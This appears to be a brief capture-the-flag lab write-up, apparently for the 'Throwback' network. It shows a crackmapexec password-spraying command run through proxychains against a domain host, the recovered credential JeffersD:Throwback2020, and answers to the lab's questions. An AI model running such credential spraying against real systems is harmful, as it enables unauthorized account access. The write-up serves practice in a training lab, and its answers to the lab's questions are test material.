# So we're doing this again....

Now that we have dumped a list of users on the domain we need to generate a wordlist of users and attempt to password spray.   


## Password Spraying with crackmapexec


```shell
proxychains crackmapexec smb 10.200.34.117 -u domain_user.txt -p passwords.txt
```

We get only one valid DC user credential pair
```
JeffersD:Throwback2020
```

- Try to ssh or evil-winrm into the domain controller as we have got the confirmation of JeffersD being a user on the domain controller.


## Questions
1. What user was successfully password sprayed? 
`JeffersD`

2. What was the password for the user?
`Throwback2020`

